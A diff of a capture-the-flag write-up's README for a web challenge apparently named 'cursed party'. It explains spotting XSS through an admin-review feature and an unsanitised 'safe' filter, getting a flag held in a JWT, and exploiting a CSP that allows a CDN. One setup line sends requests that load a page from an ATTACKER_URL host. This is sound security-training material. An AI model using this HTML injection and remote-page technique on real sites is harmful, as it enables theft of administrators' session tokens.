@@ -2,18 +2,17 @@
 
 ## website
 
-<img src= "cursed_party_website.PNG">
+<img src= "cursed_party_website.png">
 
 ## Description
 
-Anytime you see "this will be reviewed" "stored for review" Admin will review" | think XSS attack.
-NOTE: Docker file installs google chrome, potentials client-side exploit.
+Anytime we see "this will be reviewed" "stored for review" Admin will review" we can think XSS attack.
+Also, the Docker file installs google chrome, which potentialy indicates client-side exploit.
 After reviewing the source code, we can see that on the admin page. We notice the username field is vulnerable to HTML injection because it is piping the user's input to 'safe' without any sanitization.
-We can also see that the flag is inside of the JWT. So we need to get the JWT in order to get the flag. 
+We can also see that the flag is inside of the JSON Web Token(JWT). So we need to get the JWT in order to get the flag. 
 After inspecting a request, we also see that a CDN is being used in the Content Security Policy.
-We can use csp-evaluator to analyze the failures of this CSP:
-
-
+I used csp-evaluator to analyze the weaknesses of this content security policy(CSP):
+<img src= 'csp.png'>
 ## Set Up
 
 1. Burpsuite Repeater/collaborator(Testing): GET requests to /render?use_remote=true&page=https://ATTACKER_URL/test.go.
